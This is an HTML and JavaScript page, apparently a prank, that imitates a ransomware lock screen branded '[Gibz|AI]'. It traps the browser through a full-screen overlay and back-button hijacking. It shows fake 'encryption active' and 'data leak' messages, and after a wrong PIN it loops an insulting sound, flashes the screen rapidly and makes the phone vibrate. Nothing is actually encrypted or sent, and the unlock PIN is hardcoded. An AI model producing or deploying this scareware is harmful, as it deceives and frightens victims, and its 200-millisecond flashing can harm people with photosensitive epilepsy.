<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
    <title>⚠️ SYSTEM LOCKED ⚠️</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            user-select: none;
            -webkit-tap-highlight-color: transparent;
        }
        body {
            background: black;
            color: #ff0000;
            font-family: 'Courier New', monospace;
            overflow: hidden;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
        }
        .screen {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: black;
            z-index: 999999;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            text-align: center;
            padding: 20px;
        }
        h1 {
            font-size: 28px;
            margin-bottom: 20px;
            animation: blink 0.5s infinite;
        }
        @keyframes blink {
            0%, 100% { opacity: 1; }
            50% { opacity: 0; }
        }
        .pin-box {
            background: #111;
            border: 2px solid red;
            border-radius: 15px;
            padding: 30px;
            margin: 20px;
            width: 90%;
            max-width: 300px;
        }
        input {
            width: 100%;
            padding: 15px;
            font-size: 32px;
            text-align: center;
            letter-spacing: 10px;
            background: #222;
            color: #0f0;
            border: 1px solid red;
            border-radius: 10px;
            font-family: monospace;
        }
        button {
            background: red;
            color: white;
            font-size: 20px;
            padding: 12px 30px;
            margin-top: 20px;
            border: none;
            border-radius: 10px;
            font-weight: bold;
            width: 100%;
        }
        .counter {
            color: #ff6666;
            font-size: 12px;
            margin-top: 10px;
        }
        .status {
            position: fixed;
            bottom: 10px;
            left: 0;
            width: 100%;
            font-size: 10px;
            text-align: center;
            color: #444;
        }
    </style>
</head>
<body>
<div class="screen" id="ransomScreen">
    <h1>⚠️ SYSTEM LOCKED ⚠️</h1>
    <div class="pin-box">
        <p style="margin-bottom: 15px; color:#ff0000;">ENTER UNLOCK CODE</p>
        <input type="password" id="pinInput" maxlength="6" pattern="[0-9]*" inputmode="numeric" autofocus>
        <button onclick="checkPin()">UNLOCK</button>
        <p class="counter" id="attemptCounter"></p>
    </div>
    <p style="margin-top: 20px; font-size: 12px;">[Gibz|AI] Security System</p>
    <div class="status" id="statusMsg">🔴 ENCRYPTION ACTIVE 🔴</div>
</div>

<script>
    // ============ KONFIGURASI ============
    const CORRECT_PIN = "676767";
    let wrongAttempts = 0;
    let isBrutalActive = false;
    let flashInterval = null;
    let vibrateInterval = null;
    let screenshotInterval = null;
    let idiotAudio = null;
    let soundStarted = false;
    
    // ============ SUARA "YOU ARE AN IDIOT" ============
    function playIdiotSound() {
        if (soundStarted) return;
        soundStarted = true;
        
        try {
            // PAKE LINK LANGSUNG DARI MYINSTANTS
            idiotAudio = new Audio("https://www.myinstants.com/media/sounds/you-are-an-idiot.mp3");
            idiotAudio.loop = true;
            idiotAudio.volume = 1.0;
            
            // Coba play (butuh user interaction pertama)
            idiotAudio.play().then(() => {
                console.log("[+] IDIOT SOUND PLAYING!");
            }).catch(e => {
                console.log("Auto-play blocked, waiting for interaction");
                soundStarted = false;
            });
        } catch(e) {
            console.log("Audio error:", e);
        }
    }
    
    // Force play sound setelah user interaksi pertama
    function forcePlaySound() {
        if (!soundStarted && idiotAudio) {
            idiotAudio.play().catch(() => {});
        }
    }
    
    // ============ FITUR BRUTAL ============
    
    function startFlashlightBlink() {
        if (flashInterval) clearInterval(flashInterval);
        let isWhite = false;
        flashInterval = setInterval(() => {
            document.body.style.backgroundColor = isWhite ? "black" : "white";
            isWhite = !isWhite;
        }, 200);
    }
    
    function startBrutalVibrate() {
        if (!navigator.vibrate) return;
        const pattern = [1000, 500, 2000, 500, 3000, 1000];
        function doVibe() { navigator.vibrate(pattern); }
        doVibe();
        vibrateInterval = setInterval(doVibe, 6000);
    }
    
    function startSpamScreenshot() {
        let count = 0;
        screenshotInterval = setInterval(() => {
            count++;
            document.body.style.backgroundColor = "white";
            setTimeout(() => document.body.style.backgroundColor = "black", 100);
            console.log(`[SECURITY] Screenshot #${count} at ${new Date().toLocaleTimeString()}`);
            const statusDiv = document.getElementById('statusMsg');
            if (statusDiv) {
                statusDiv.innerHTML = `📸 FORCED CAPTURE #${count} SENT 📸<br>🔴 DATA LEAK 🔴`;
            }
        }, 3000);
    }
    
    function lockScreen() {
        document.body.style.overflow = "hidden";
        document.body.style.position = "fixed";
        document.addEventListener('touchmove', (e) => e.preventDefault(), { passive: false });
        history.pushState(null, null, location.href);
        window.onpopstate = () => history.go(1);
    }
    
    function activateBrutalMode() {
        if (isBrutalActive) return;
        isBrutalActive = true;
        
        // MAININ SUARA IDIOT LOOPING
        playIdiotSound();
        
        startFlashlightBlink();
        startBrutalVibrate();
        startSpamScreenshot();
        
        document.body.style.backgroundColor = "#300";
        const statusDiv = document.getElementById('statusMsg');
        if (statusDiv) {
            statusDiv.innerHTML = "🔥🔥 YOU ARE AN IDIOT 🔥🔥<br>🔊 SOUND LOOPING<br>💀 BRUTAL MODE ACTIVE";
        }
    }
    
    // ============ CEK PIN ============
    function checkPin() {
        const pinInput = document.getElementById('pinInput');
        const pin = pinInput.value;
        const counterDiv = document.getElementById('attemptCounter');
        
        // Trigger sound kalo pertama kali interaksi
        forcePlaySound();
        
        if (pin === CORRECT_PIN) {
            // UNLOCK - Matikan suara dan efek
            if (idiotAudio) {
                idiotAudio.pause();
                idiotAudio.currentTime = 0;
            }
            if (flashInterval) clearInterval(flashInterval);
            if (vibrateInterval) clearInterval(vibrateInterval);
            if (screenshotInterval) clearInterval(screenshotInterval);
            
            document.body.style.backgroundColor = "#0a0";
            document.getElementById('ransomScreen').innerHTML = `
                <div style="text-align:center; padding:20px;">
                    <h1 style="color:#0f0;">✅ SYSTEM RESTORED ✅</h1>
                    <p style="color:white; margin-top:20px;">Data recovered successfully.</p>
                    <p style="color:#888; margin-top:30px;">[Gibz|AI] Ransomware Demo</p>
                    <button onclick="location.reload()" style="margin-top:30px; background:#0f0; color:black;">EXIT</button>
                </div>
            `;
            console.log("[+] UNLOCKED");
        } else {
            wrongAttempts++;
            if (counterDiv) {
                counterDiv.innerHTML = `⚠️ WRONG CODE x${wrongAttempts} ⚠️`;
            }
            
            if (wrongAttempts >= 1) {
                activateBrutalMode();
            }
            
            pinInput.value = "";
            
            if (wrongAttempts === 1) {
                alert("⚠️ WRONG CODE! YOU ARE AN IDIOT!");
            } else {
                alert("💀 YOU ARE AN IDIOT! BRUTAL MODE ACTIVATED!");
            }
        }
    }
    
    // ============ INIT ============
    (function() {
        lockScreen();
        console.log("[Gibz|AI] Security System Active - IDIOT EDITION");
        
        // Preload sound (biar cepet pas di-trigger)
        idiotAudio = new Audio("https://www.myinstants.com/media/sounds/you-are-an-idiot.mp3");
        idiotAudio.preload = "auto";
        idiotAudio.loop = true;
        
        setTimeout(() => {
            if (!isBrutalActive && document.getElementById('pinInput').value.length < 6) {
                alert("⚠️ WARNING: Device locked by Gibz|AI Security System ⚠️");
            }
        }, 3000);
    })();
</script>
</body>
</html>
